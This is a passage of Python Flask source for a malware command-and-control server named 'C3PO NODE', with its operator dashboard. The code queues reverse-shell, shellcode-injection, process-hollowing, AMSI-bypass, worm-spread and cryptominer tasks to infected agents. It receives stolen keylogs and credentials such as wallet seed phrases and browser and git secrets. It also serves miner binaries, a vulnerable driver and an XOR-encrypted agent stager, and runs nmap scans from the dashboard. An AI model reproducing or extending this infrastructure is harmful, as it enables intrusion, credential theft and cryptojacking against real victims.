            {% for proc in h['wmi_procs'].split(',') if proc %}
              <span class="process-tag">{{ proc }}</span>
            {% endfor %}
          </div>
        </details>
        {% endif %}

        <!-- Notes -->
        {% if h['notes'] %}
        <div style="margin-top:8px">
          {% for note in h['notes'].split('|') if note %}
            <div style="color:#f78166;font-size:11px">&#9654; {{ note }}</div>
          {% endfor %}
        </div>
        {% endif %}

      </div>
      {% endfor %}
      {% endif %}
    </div>

    <!-- ── NMAP SCANNER ── -->
    <div id="panel-nmap" class="panel">
      <div class="section-hdr">
        <h2 style="color:#d2a8ff">&#128270; Nmap Scanner</h2>
        <span style="color:#8b949e;font-size:11px">Runs from the C2 server — target must be reachable from this machine. Results are saved to Discovered Hosts.</span>
      </div>

      <!-- Quick targets management -->
      <div class="cmd-panel" style="margin-bottom:12px">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
          <h3 style="margin:0">Quick Targets</h3>
          <button onclick="toggleQTForm()" class="btn btn-sm">+ Add</button>
        </div>
        <div id="qt-form" style="display:none;margin-bottom:10px;display:none">
          <div style="display:flex;gap:6px;align-items:flex-end;flex-wrap:wrap">
            <div>
              <label style="display:block;font-size:11px;color:#8b949e;margin-bottom:2px">Label</label>
              <input id="qt-label" type="text" placeholder="e.g. Lab subnet"
                style="background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:5px 8px;border-radius:4px;width:140px;font-size:12px">
            </div>
            <div>
              <label style="display:block;font-size:11px;color:#8b949e;margin-bottom:2px">IP / CIDR / Hostname</label>
              <input id="qt-value" type="text" placeholder="e.g. 192.168.1.0/24 or hostname"
                style="background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:5px 8px;border-radius:4px;width:180px;font-size:12px">
            </div>
            <button onclick="addQuickTarget()" class="btn btn-green" style="padding:5px 12px">Save</button>
            <button onclick="toggleQTForm()" class="btn btn-sm">Cancel</button>
          </div>
          <div id="qt-err" style="font-size:11px;color:#f85149;margin-top:4px;display:none"></div>
        </div>
        <div id="qt-buttons" style="display:flex;gap:6px;flex-wrap:wrap;min-height:24px">
          {% if quick_targets %}
            {% for qt in quick_targets %}
            <span style="display:inline-flex;align-items:center;gap:3px">
              <button onclick="document.getElementById('nmap-target').value='{{ qt.value }}'" class="btn btn-sm">{{ qt.label }}</button>
              <button onclick="removeQuickTarget({{ qt.id }}, this)" style="background:none;border:none;color:#f85149;cursor:pointer;font-size:10px;padding:0 2px" title="Remove">✕</button>
            </span>
            {% endfor %}
          {% else %}
            <span style="font-size:11px;color:#555">No quick targets — click + Add to create one</span>
          {% endif %}
        </div>
      </div>

      <div class="cmd-panel" style="margin-bottom:16px">
        <h3>Launch Scan</h3>
        <div style="margin-bottom:8px;font-size:11px;color:#8b949e">
          Runs from <strong>this C2 machine</strong> — target must be reachable from here.
        </div>
        <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:flex-end">
          <div>
            <label style="display:block;font-size:11px;color:#8b949e;margin-bottom:4px">Target IP / CIDR</label>
            <input id="nmap-target" type="text" placeholder="IP, CIDR, or hostname"
              style="background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;width:220px;font-size:12px">
          </div>
          <div>
            <label style="display:block;font-size:11px;color:#8b949e;margin-bottom:4px">Scan Type</label>
            <select id="nmap-flags"
              style="background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;font-size:12px;min-width:300px">
              <option value="-sT -Pn">-sT -Pn  |  TCP Connect, skip ping (reliable, works over VPN)</option>
              <option value="-sT -Pn -sV">-sT -Pn -sV  |  TCP + version banners</option>
              <option value="-sT -Pn -A">-sT -Pn -A  |  Aggressive: version + OS + scripts</option>
              <option value="-sT -Pn -O">-sT -Pn -O  |  OS fingerprint (needs root)</option>
              <option value="-sS -Pn">-sS -Pn  |  SYN stealth (needs root, avoids connection logs)</option>
              <option value="-sS -Pn -sV -O">-sS -Pn -sV -O  |  Full stealth + version + OS (root)</option>
              <option value="-sU -Pn">-sU -Pn  |  UDP scan (slow, needs root)</option>
              <option value="-sT -Pn -p-">-sT -Pn -p-  |  All 65535 TCP ports (thorough, slow)</option>
            </select>
          </div>
          <div>
            <label style="display:block;font-size:11px;color:#8b949e;margin-bottom:4px">Custom Ports (optional)</label>
            <input id="nmap-ports" type="text" placeholder="22,80,443 or 1-1000"
              style="background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;width:160px;font-size:12px">
          </div>
          <button onclick="runNmap()" class="btn btn-green">&#9654; Scan</button>
        </div>
        <div id="nmap-error" style="margin-top:6px;font-size:11px;color:#f85149;display:none"></div>
        <div id="nmap-status" style="margin-top:10px;font-size:11px;color:#8b949e;display:none">
          &#9899; Scanning… (may take 30–180s depending on scan type and port range)
        </div>
      </div>

      <div id="nmap-results" style="display:none">
        <div class="cmd-panel">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
            <h3 id="nmap-result-hdr">Results</h3>
            <button onclick="document.getElementById('nmap-results').style.display='none'" class="btn btn-sm">&#10005; Clear</button>
          </div>
          <pre id="nmap-output" style="font-size:11px;white-space:pre-wrap;color:#e6edf3;background:#0d1117;padding:12px;border-radius:4px;max-height:500px;overflow-y:auto"></pre>
        </div>
      </div>

      <div class="cmd-panel" style="margin-top:16px">
        <h3>Scan Type Reference</h3>
        <table>
          <thead><tr><th>Flag</th><th>Name</th><th>Root?</th><th>Speed</th><th>Use when</th></tr></thead>
          <tbody>
          <tr><td><code>-sT</code></td><td>TCP Connect</td><td>No</td><td>Medium</td><td>Default, works everywhere, leaves connection logs</td></tr>
          <tr><td><code>-sS</code></td><td>SYN Stealth</td><td>Yes</td><td>Fast</td><td>Doesn't complete handshake — stealthier, fewer logs</td></tr>
          <tr><td><code>-sU</code></td><td>UDP</td><td>Yes</td><td>Slow</td><td>Find DNS, SNMP, DHCP, VPN — UDP services invisible to TCP scans</td></tr>
          <tr><td><code>-sV</code></td><td>Version</td><td>No</td><td>Slow</td><td>Banner grab — tells you Apache 2.4.51, OpenSSH 8.9 etc.</td></tr>
          <tr><td><code>-O</code></td><td>OS Detect</td><td>Yes</td><td>Medium</td><td>TCP/IP stack fingerprint → Windows 10, Ubuntu 22.04</td></tr>
          <tr><td><code>-A</code></td><td>Aggressive</td><td>No</td><td>Slow</td><td>Everything: OS + version + NSE scripts + traceroute</td></tr>
          <tr><td><code>-p-</code></td><td>All ports</td><td>No</td><td>Very slow</td><td>Full coverage, catches non-standard service ports</td></tr>
          </tbody>
        </table>
        <div style="margin-top:12px;font-size:11px;color:#8b949e">
          <strong>Tip:</strong> If a target is on a different network segment, use its VPN/overlay IP (Tailscale, WireGuard, etc.) rather than its LAN IP.
          -sS (SYN stealth) may not work correctly over VPN tunnels — use -sT for cross-network scans.
        </div>
      </div>

      <script>
      function toggleQTForm() {
        const f = document.getElementById('qt-form');
        f.style.display = f.style.display === 'none' ? 'block' : 'none';
      }
      async function addQuickTarget() {
        const label = document.getElementById('qt-label').value.trim();
        const value = document.getElementById('qt-value').value.trim();
        const errEl = document.getElementById('qt-err');
        errEl.style.display = 'none';
        if (!label || !value) { errEl.textContent = 'Both fields required'; errEl.style.display = ''; return; }
        const form = new FormData();
        form.append('label', label);
        form.append('value', value);
        const resp = await fetch('/admin/quick_targets', {method:'POST', body:form});
        const data = await resp.json();
        if (data.error) { errEl.textContent = data.error; errEl.style.display = ''; return; }
        location.reload();
      }
      async function removeQuickTarget(id, btn) {
        await fetch('/admin/quick_targets/' + id, {method:'DELETE'});
        btn.closest('span').remove();
        const box = document.getElementById('qt-buttons');
        if (!box.querySelector('button')) {
          box.innerHTML = '<span style="font-size:11px;color:#555">No quick targets — click + Add to create one</span>';
        }
      }
      async function runNmap() {
        const target  = document.getElementById('nmap-target').value.trim();
        const flags   = document.getElementById('nmap-flags').value;
        const ports   = document.getElementById('nmap-ports').value.trim();
        const errEl   = document.getElementById('nmap-error');
        errEl.style.display = 'none';
        if (!target) { errEl.textContent = 'Enter a target IP or CIDR'; errEl.style.display = ''; return; }
        document.getElementById('nmap-status').style.display = 'block';
        document.getElementById('nmap-results').style.display = 'none';
        const form = new FormData();
        form.append('target', target);
        form.append('flags', flags);
        form.append('ports', ports);
        try {
          const resp = await fetch('/admin/nmap', {method:'POST', body:form});
          const data = await resp.json();
          document.getElementById('nmap-status').style.display = 'none';
          if (data.error) {
            errEl.textContent = '✕ ' + data.error;
            errEl.style.display = '';
            return;
          }
          const hostsMsg = data.hosts_found > 0
            ? `  ·  ${data.hosts_found} host(s) with open ports saved to Network Map`
            : '  ·  no open ports found (host may be down or all ports filtered)';
          document.getElementById('nmap-result-hdr').textContent =
            `nmap ${data.flags} ${data.target}${hostsMsg}`;
          document.getElementById('nmap-output').textContent = data.output || '(no output)';
          document.getElementById('nmap-results').style.display = 'block';
        } catch(e) {
          document.getElementById('nmap-status').style.display = 'none';
          errEl.textContent = 'Request failed: ' + e;
          errEl.style.display = '';
        }
      }
      </script>
    </div>

  </div><!-- /content -->
</div><!-- /main -->

<script>
function show(tab) {
  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
  document.getElementById('panel-' + tab).classList.add('active');
  event.currentTarget.classList.add('active');
}

function applyPreset(sel) {
  if (!sel.value) return;
  var parts = sel.value.split(':');
  var typeSelect = document.querySelector('select[name=type]');
  var payloadInput = document.getElementById('payload-input');
  typeSelect.value = parts[0];
  payloadInput.value = parts.slice(1).join(':');
}

function updatePayloadHint(sel) {
  var hints = {
    exec:'cmd command', ps:'powershell script',
    revshell:'IP:PORT  e.g. 192.168.1.10:4444',
    shellcode:'base64 shellcode, or KEY:base64 for XOR-encoded',
    amsi_bypass:'(no payload)', spread:'(no payload)',
    worm_scan:'(no payload) — deep network intel scan',
    inject:'remote PID BASE64SC  |  hollow C:\\Windows\\System32\\svchost.exe BASE64SC',
    mine_start:'COIN WALLET [POOL] [CPU_CAP%] [GPU=0|1]  e.g. xmr WALLET pool.supportxmr.com:443 50 0',
    mine_stop:'(no payload)', mine_status:'(no payload)',
    keylog_flush:'(no payload)', harvest:'(no payload)',
    inventory:'(no payload)', persist_check:'(no payload)',
    persist_remove:'(no payload)', update:'(leave blank for latest)'
  };
  document.getElementById('payload-input').placeholder = hints[sel.value] || 'payload';
}

function filterKeylogs(sel) {
  var val = sel.value;
  document.querySelectorAll('.keylog-entry').forEach(function(el) {
    el.style.display = (!val || el.dataset.agent === val) ? '' : 'none';
  });
}
</script>
</body>
</html>'''

# ── login page ────────────────────────────────────────────────────────────────

LOGIN_HTML = '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>C3PO NODE — Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0f;display:flex;align-items:center;justify-content:center;height:100vh;font-family:'Courier New',monospace}
.box{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:32px;width:320px}
h2{color:#58a6ff;margin-bottom:20px;font-size:16px;text-align:center;letter-spacing:2px}
input{width:100%;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:10px;border-radius:5px;font-family:inherit;margin-bottom:10px}
button{width:100%;background:#1f6feb;color:#fff;border:none;padding:10px;border-radius:5px;cursor:pointer;font-family:inherit}
button:hover{background:#388bfd}
.err{color:#f85149;font-size:12px;margin-bottom:8px;text-align:center}
</style></head><body>
<div class="box">
  <h2>&#9679; C3PO NODE</h2>
  {% if error %}<div class="err">{{ error }}</div>{% endif %}
  <form method="POST">
    <input type="text" name="username" placeholder="username" autofocus>
    <input type="password" name="password" placeholder="password">
    <button type="submit">Login</button>
  </form>
</div></body></html>'''

# ── admin routes ───────────────────────────────────────────────────────────────

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if is_authed():
        return redirect('/')
    error = None
    if request.method == 'POST':
        u = request.form.get('username', '')
        p = request.form.get('password', '')
        if u == ADMIN_USER and check_password_hash(ADMIN_HASH, p):
            tok = secrets.token_hex(32)
            _sessions[tok] = {'user': u, 'at': time.time()}
            resp = make_response(redirect('/'))
            resp.set_cookie(COOKIE_NAME, tok, httponly=True,
                            samesite='Lax', max_age=86400 * 7)
            return resp
        error = 'Invalid credentials'
    return render_template_string(LOGIN_HTML, error=error)

@app.route('/logout')
def logout():
    tok = _get_token()
    _sessions.pop(tok, None)
    resp = make_response(redirect('/login'))
    resp.delete_cookie(COOKIE_NAME)
    return resp

@app.route('/')
@require_auth
def index():
    conn = db()
    nodes = conn.execute('SELECT * FROM nodes ORDER BY last_seen DESC').fetchall()
    tasks = conn.execute("SELECT * FROM tasks ORDER BY created_at DESC LIMIT 100").fetchall()
    keylogs = conn.execute('SELECT * FROM keylogs ORDER BY received_at DESC LIMIT 30').fetchall()

    netmon_raw = conn.execute('SELECT * FROM netmon ORDER BY received_at DESC LIMIT 10').fetchall()
    netmon_rows = []
    for nm in netmon_raw:
        try:
            conns_data = json.loads(nm['connections'])
            conns_list = [type('C', (), c)() for c in conns_data] if isinstance(conns_data, list) else []
            # Convert dicts to objects with attribute access
            class Conn:
                def __init__(self, d):
                    self.__dict__.update(d)
            conns_list = [Conn(c) for c in conns_data] if isinstance(conns_data, list) else []
            netmon_rows.append({'agent_id': nm['agent_id'], 'received_at': nm['received_at'], 'connections': conns_list})
        except:
            pass

    discovered_raw = conn.execute('SELECT * FROM discovered ORDER BY first_seen DESC').fetchall()
    # Pull nmap port data from nmap_scans and merge into discovered rows by IP
    nmap_ports = {}
    for row in conn.execute("SELECT host_ip, open_ports FROM nmap_scans WHERE open_ports IS NOT NULL").fetchall():
        ip = row['host_ip']
        ports = [p.strip() for p in (row['open_ports'] or '').split(',') if p.strip()]
        if ip not in nmap_ports:
            nmap_ports[ip] = set()
        nmap_ports[ip].update(ports)
    discovered = []
    for h in discovered_raw:
        h = dict(h)
        agent_ports = set(p.strip() for p in (h.get('open_ports') or '').split(',') if p.strip())
        nmap_p = nmap_ports.get(h['ip'], set())
        merged = agent_ports | nmap_p
        h['open_ports'] = ','.join(sorted(merged, key=lambda x: int(x) if x.isdigit() else 0))
        h['has_nmap'] = bool(nmap_p)
        discovered.append(h)
    agent_versions = conn.execute('SELECT * FROM agent_versions ORDER BY uploaded_at DESC').fetchall()
    inventories = conn.execute('SELECT id,agent_id,collected_at,received_at,length(data) as data_size FROM inventories ORDER BY received_at DESC').fetchall()
    credentials = conn.execute('''SELECT * FROM credentials
        ORDER BY
          CASE type WHEN "seed_phrase" THEN 0 WHEN "key_file" THEN 1 WHEN "browser" THEN 2
                    WHEN "git_credentials" THEN 3 WHEN "env_var" THEN 4 ELSE 5 END,
          received_at DESC
        LIMIT 2000''').fetchall()

    # Network intelligence reports — parse open_ports JSON for template rendering
    netintel_raw = conn.execute('SELECT * FROM netintel ORDER BY received_at DESC LIMIT 100').fetchall()
    netintel = []
    for row in netintel_raw:
        d = dict(row)
        try:
            d['open_ports_parsed'] = json.loads(d.get('open_ports') or '[]')
        except:
            d['open_ports_parsed'] = []
        netintel.append(d)

    online_count = sum(1 for n in nodes if (time.time() - (n['last_seen'] or 0)) < 120)
    pending_count = conn.execute("SELECT COUNT(*) FROM tasks WHERE status='pending'").fetchone()[0]
    completed_tasks = conn.execute("SELECT COUNT(*) FROM tasks WHERE status IN ('completed','ok')").fetchone()[0]
    keylog_count = conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
    netmon_count = conn.execute("SELECT COUNT(*) FROM netmon").fetchone()[0]
    disc_count = conn.execute("SELECT COUNT(*) FROM discovered").fetchone()[0]
    inv_count = conn.execute("SELECT COUNT(*) FROM inventories").fetchone()[0]
    cred_count = conn.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
    netintel_count = conn.execute("SELECT COUNT(DISTINCT host_ip) FROM netintel").fetchone()[0]

    # Latest miner stats per agent
    miner_stats_rows = conn.execute(
        '''SELECT ms.* FROM miner_stats ms
           INNER JOIN (SELECT agent_id, MAX(received_at) as lat FROM miner_stats GROUP BY agent_id)
           latest ON ms.agent_id=latest.agent_id AND ms.received_at=latest.lat
           ORDER BY ms.received_at DESC'''
    ).fetchall()
    mining_active = sum(1 for _ in miner_stats_rows)

    # Miner binary availability — check miner_bins/ first, then uploads/
    miner_bin_ready  = any(os.path.exists(os.path.join(d, 'xmrig.exe'))
                           for d in [MINER_BINS, UPLOADS])
    miner_cuda_ready = any(os.path.exists(os.path.join(d, 'xmrig-cuda.dll'))
                           for d in [MINER_BINS, UPLOADS])

    recent_results = conn.execute(
        "SELECT * FROM tasks WHERE status IN ('completed','ok','error') ORDER BY completed_at DESC LIMIT 5"
    ).fetchall()
    quick_targets = conn.execute('SELECT * FROM quick_targets ORDER BY created_at ASC').fetchall()

    conn.close()
    return render_template_string(HTML,
        server_version=VERSION,
        now=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        nodes=nodes, tasks=tasks, keylogs=keylogs,
        netmon_rows=netmon_rows, discovered=discovered,
        agent_versions=agent_versions,
        inventories=inventories, credentials=credentials,
        netintel=netintel,
        online_count=online_count, pending_count=pending_count,
        completed_tasks=completed_tasks, keylog_count=keylog_count,
        netmon_count=netmon_count, disc_count=disc_count,
        inv_count=inv_count, cred_count=cred_count,
        netintel_count=netintel_count,
        miner_stats_rows=miner_stats_rows,
        mining_active=mining_active,
        miner_bin_ready=miner_bin_ready,
        miner_cuda_ready=miner_cuda_ready,
        recent_results=recent_results,
        quick_targets=quick_targets,
        flash_task=request.args.get('queued')
    )

@app.route('/admin/task', methods=['POST'])
@require_auth
def queue_task():
    agent_id = request.form.get('agent_id', '')
    task_type = request.form.get('type', 'exec')
    payload   = request.form.get('payload', '')
    if not agent_id:
        return redirect('/')
    task_id = str(uuid.uuid4())
    with db() as conn:
        conn.execute(
            'INSERT INTO tasks (task_id, agent_id, type, payload, status, created_at) VALUES (?,?,?,?,?,?)',
            (task_id, agent_id, task_type, payload, 'pending', time.time())
        )
    return redirect(f'/?queued={task_id[:8]}#panel-command')

@app.route('/admin/upload', methods=['POST'])
@require_auth
def upload_agent():
    f = request.files.get('agent_file')
    version = request.form.get('version', '').strip()
    notes   = request.form.get('notes', '').strip()
    if not f or not version:
        return redirect('/')
    filename = f'c3po-node-v{version}.exe'
    f.save(os.path.join(UPLOADS, filename))
    with db() as conn:
        conn.execute(
            'INSERT INTO agent_versions (version, filename, notes, uploaded_at, is_current) VALUES (?,?,?,?,0)',
            (version, filename, notes, time.time())
        )
    return redirect('/')

@app.route('/admin/promote/<int:vid>', methods=['POST'])
@require_auth
def promote_version(vid):
    with db() as conn:
        conn.execute('UPDATE agent_versions SET is_current=0')
        conn.execute('UPDATE agent_versions SET is_current=1 WHERE id=?', (vid,))
    return redirect('/')

@app.route('/admin/push_update', methods=['POST'])
@require_auth
def push_update():
    with db() as conn:
        nodes = conn.execute('SELECT agent_id FROM nodes').fetchall()
        for n in nodes:
            task_id = str(uuid.uuid4())
            conn.execute(
                'INSERT INTO tasks (task_id, agent_id, type, payload, status, created_at) VALUES (?,?,?,?,?,?)',
                (task_id, n['agent_id'], 'update', '', 'pending', time.time())
            )
    return redirect('/')

# ── agent API ──────────────────────────────────────────────────────────────────

@app.route('/beacon', methods=['POST'])
@limiter.limit('120 per minute')
def beacon():
    # Support both encrypted (v1.5+) and plain JSON (legacy v1.4.x) agents
    d = request.form.get('d')
    if d:
        raw = c2_decrypt(d)
        data = json.loads(raw) if raw else None
    else:
        data = request.get_json(silent=True)
    if not data:
        return jsonify({}), 400

    agent_id = data.get('agent_id', 'unknown')
    info = data.get('info', {})
    encrypted_agent = bool(d)  # track whether this agent uses encryption

    with db() as conn:
        existing = conn.execute('SELECT agent_id FROM nodes WHERE agent_id=?', (agent_id,)).fetchone()
        if existing:
            conn.execute(
                'UPDATE nodes SET hostname=?,username=?,os=?,arch=?,local_ips=?,version=?,last_seen=? WHERE agent_id=?',
                (info.get('hostname'), info.get('username'), data.get('os'),
                 data.get('arch'), info.get('local_ips'), data.get('version'),
                 time.time(), agent_id)
            )
        else:
            conn.execute(
                'INSERT INTO nodes (agent_id,hostname,username,os,arch,local_ips,version,first_seen,last_seen) VALUES (?,?,?,?,?,?,?,?,?)',
                (agent_id, info.get('hostname'), info.get('username'),
                 data.get('os'), data.get('arch'), info.get('local_ips'),
                 data.get('version'), time.time(), time.time())
            )

        task = conn.execute(
            "SELECT * FROM tasks WHERE agent_id=? AND status='pending' ORDER BY created_at ASC LIMIT 1",
            (agent_id,)
        ).fetchone()

        if task:
            conn.execute("UPDATE tasks SET status='sent' WHERE task_id=?", (task['task_id'],))
            task_dict = {'task_id': task['task_id'], 'type': task['type'], 'payload': task['payload']}
            if encrypted_agent:
                return c2_encrypt(json.dumps(task_dict)), 200, {'Content-Type': 'text/plain'}
            return jsonify(task_dict)

    if encrypted_agent:
        return c2_encrypt('{}'), 200, {'Content-Type': 'text/plain'}
    return jsonify({})

@app.route('/result', methods=['POST'])
@limiter.limit('60 per minute')
def receive_result():
    d = request.form.get('d')
    if d:
        raw = c2_decrypt(d)
        data = json.loads(raw) if raw else None
    else:
        data = request.get_json(silent=True)
    if not data:
        return jsonify({}), 400
    with db() as conn:
        conn.execute(
            "UPDATE tasks SET status=?, output=?, completed_at=? WHERE task_id=?",
            (data.get('status', 'completed'), data.get('output', ''), time.time(), data.get('task_id'))
        )
    return jsonify({'ok': True})

@app.route('/keylog', methods=['POST'])
@limiter.limit('60 per minute')
def receive_keylog():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({}), 400
    with db() as conn:
        conn.execute(
            'INSERT INTO keylogs (agent_id, data, received_at) VALUES (?,?,?)',
            (data.get('agent_id'), data.get('data', ''), time.time())
        )
    return jsonify({'ok': True})

@app.route('/netmon', methods=['POST'])
@limiter.limit('60 per minute')
def receive_netmon():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({}), 400
    with db() as conn:
        conn.execute(
            'INSERT INTO netmon (agent_id, connections, received_at) VALUES (?,?,?)',
            (data.get('agent_id'), json.dumps(data.get('connections', [])), time.time())
        )
    return jsonify({'ok': True})

@app.route('/discovered', methods=['POST'])
@limiter.limit('30 per minute')
def receive_discovered():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({}), 400
    agent_id = data.get('agent_id', '')
    hosts = data.get('hosts', [])
    with db() as conn:
        for h in hosts:
            ports = ','.join(str(p) for p in h.get('ports', []))
            try:
                conn.execute(
                    'INSERT OR IGNORE INTO discovered (discovered_by,ip,hostname,open_ports,has_smb,first_seen) VALUES (?,?,?,?,?,?)',
                    (agent_id, h.get('ip'), h.get('hostname',''), ports, 1 if h.get('has_smb') else 0, time.time())
                )
            except:
                pass
    return jsonify({'ok': True})

@app.route('/inventory', methods=['POST'])
@limiter.limit('30 per minute')
def receive_inventory():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({}), 400
    agent_id = data.get('agent_id', 'unknown')
    inner = data.get('data', {})
    collected_at = (inner.get('meta') or {}).get('collected_at', '')
    with db() as conn:
        conn.execute(
            'INSERT INTO inventories (agent_id, collected_at, data, received_at) VALUES (?,?,?,?)',
            (agent_id, collected_at, json.dumps(inner), time.time())
        )
    return jsonify({'ok': True})

@app.route('/api/inventory/<int:inv_id>')
@require_auth
def view_inventory(inv_id):
    with db() as conn:
        row = conn.execute('SELECT data FROM inventories WHERE id=?', (inv_id,)).fetchone()
    if not row:
        return jsonify({'error': 'not found'}), 404
    try:
        return app.response_class(
            response=json.dumps(json.loads(row['data']), indent=2),
            mimetype='application/json'
        )
    except:
        return row['data'], 200, {'Content-Type': 'application/json'}

@app.route('/creds', methods=['POST'])
@limiter.limit('30 per minute')
def receive_creds():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({}), 400
    agent_id = data.get('agent_id', 'unknown')
    creds = data.get('credentials', [])
    with db() as conn:
        inserted = 0
        for c in creds:
            ctype    = c.get('type','')
            url      = c.get('url','')
            username = c.get('username','')
            secret   = c.get('secret','')
            file_path= c.get('file_path','')
            pattern  = c.get('pattern','')
            context  = c.get('context','')
            # Dedup: for browser/git, key on (agent, type, url, username)
            # For file-based, key on (agent, type, file_path, pattern, secret[:64])
            # This prevents re-harvest stacking while preserving distinct credentials
            if ctype in ('browser', 'git_credentials'):
                dup = conn.execute(
                    'SELECT id FROM credentials WHERE agent_id=? AND type=? AND url=? AND username=?',
                    (agent_id, ctype, url, username)
                ).fetchone()
            else:
                dup = conn.execute(
                    '''SELECT id FROM credentials WHERE agent_id=? AND type=?
                       AND COALESCE(file_path,'')=? AND COALESCE(pattern,'')=?
                       AND substr(COALESCE(secret,''),1,64)=substr(?,1,64)''',
                    (agent_id, ctype, file_path, pattern, secret)
                ).fetchone()
            if not dup:
                conn.execute(
                    '''INSERT INTO credentials
                       (agent_id,source,type,url,username,secret,file_path,context_text,pattern,received_at)
                       VALUES (?,?,?,?,?,?,?,?,?,?)''',
                    (agent_id, c.get('source',''), ctype, url, username,
                     secret, file_path, context, pattern, time.time())
                )
                inserted += 1
    return jsonify({'ok': True, 'stored': inserted})

@app.route('/admin/upload_miner', methods=['POST'])
@require_auth
def upload_miner():
    f = request.files.get('miner_file')
    mtype = request.form.get('miner_type', 'xmrig')
    if not f:
        return redirect('/')
    filename = 'xmrig.exe' if mtype == 'xmrig' else 'xmrig-cuda.dll'
    f.save(os.path.join(UPLOADS, filename))
    return redirect('/')

@app.route('/miner/xmrig')
def serve_miner_bin():
    # Check miner_bins/ first (pre-downloaded), then uploads/ (operator-uploaded)
    for directory in [MINER_BINS, UPLOADS]:
        path = os.path.join(directory, 'xmrig.exe')
        if os.path.exists(path):
            return send_from_directory(directory, 'xmrig.exe', as_attachment=True,
                                       mimetype='application/octet-stream')
    return jsonify({'error': 'xmrig.exe not found — add to miner_bins/ or upload via dashboard'}), 404

@app.route('/miner/winring')
def serve_winring():
    for directory in [MINER_BINS, UPLOADS]:
        path = os.path.join(directory, 'WinRing0x64.sys')
        if os.path.exists(path):
            return send_from_directory(directory, 'WinRing0x64.sys', as_attachment=True,
                                       mimetype='application/octet-stream')
    return jsonify({'error': 'not found'}), 404

@app.route('/miner/cuda')
def serve_cuda_plugin():
    for directory in [MINER_BINS, UPLOADS]:
        path = os.path.join(directory, 'xmrig-cuda.dll')
        if os.path.exists(path):
            return send_from_directory(directory, 'xmrig-cuda.dll', as_attachment=True,
                                       mimetype='application/octet-stream')
    return jsonify({'error': 'not uploaded'}), 404

@app.route('/files/<path:filename>')
def serve_file(filename):
    """Generic file endpoint — serves from uploads/. Used by byovd_arm to fetch gdrv.sys."""
    safe = os.path.basename(filename)  # prevent path traversal
    path = os.path.join(UPLOADS, safe)
    if os.path.exists(path):
        return send_from_directory(UPLOADS, safe, as_attachment=True,
                                   mimetype='application/octet-stream')
    return jsonify({'error': f'{safe} not found in uploads/'}), 404

@app.route('/miner_stats', methods=['POST'])
@limiter.limit('60 per minute')
def receive_miner_stats():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({}), 400
    agent_id = data.get('agent_id', 'unknown')
    s = data.get('stats', {})
    with db() as conn:
        conn.execute('''
            INSERT INTO miner_stats
              (agent_id, coin, hashrate, accepted, rejected, uptime_secs,
               gpu_name, cpu_name, pool, received_at)
            VALUES (?,?,?,?,?,?,?,?,?,?)
        ''', (
            agent_id, s.get('coin',''), s.get('hashrate_hs', 0),
            s.get('accepted', 0), s.get('rejected', 0), s.get('uptime_secs', 0),
            s.get('gpu_name',''), s.get('cpu_name',''), s.get('pool',''),
            time.time()
        ))
    return jsonify({'ok': True})

@app.route('/netintel', methods=['POST'])
@limiter.limit('60 per minute')
def receive_netintel():
    data = request.get_json(silent=True)
    if not data:
        return jsonify({}), 400
    agent_id = data.get('agent_id', 'unknown')
    ports_json = json.dumps(data.get('open_ports', []))
    shares = ','.join(data.get('smb_shares') or [])
    procs = ','.join(data.get('wmi_procs') or [])
    notes = '|'.join(data.get('notes') or [])
    with db() as conn:
        # Upsert per agent + host_ip — replace if same host re-scanned
        conn.execute('''
            INSERT INTO netintel
              (agent_id, scan_time, host_ip, hostname, open_ports,
               smb_shares, wmi_procs, redis_info, mongo_open, notes, raw, received_at)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?)
        ''', (
            agent_id, data.get('scan_time', ''), data.get('host_ip', ''),
            data.get('hostname', ''), ports_json,
            shares, procs,
            data.get('redis_info', ''), 1 if data.get('mongo_open') else 0,
            notes, json.dumps(data), time.time()
        ))
    return jsonify({'ok': True})

# ── update delivery ────────────────────────────────────────────────────────────

@app.route('/update/version')
def update_version():
    with db() as conn:
        v = conn.execute('SELECT version FROM agent_versions WHERE is_current=1').fetchone()
    return jsonify({'version': v['version'] if v else VERSION})

@app.route('/update/agent')
def update_agent():
    with db() as conn:
        v = conn.execute('SELECT filename FROM agent_versions WHERE is_current=1').fetchone()
    if not v:
        return jsonify({'error': 'no current version'}), 404
    return send_from_directory(UPLOADS, v['filename'], as_attachment=True)

# ── stage1 payload delivery (XOR-encrypted for stager) ────────────────────────

STAGE1_KEY = os.environ.get('STAGE1_KEY', 'c3p0stgr').encode()

@app.route('/stage1')
def serve_stage1():
    """Serve the current agent EXE XOR-encrypted with STAGE1_KEY.
    The stager decrypts and runs it in %APPDATA%\\Microsoft\\Windows\\Themes\\."""
    with db() as conn:
        v = conn.execute('SELECT filename FROM agent_versions WHERE is_current=1').fetchone()
    if not v:
        return '', 404
    path = os.path.join(UPLOADS, v['filename'])
    if not os.path.exists(path):
        return '', 404
    with open(path, 'rb') as f:
        data = bytearray(f.read())
    key = STAGE1_KEY
    for i in range(len(data)):
        data[i] ^= key[i % len(key)]
    resp = make_response(bytes(data))
    resp.headers['Content-Type'] = 'application/octet-stream'
    return resp

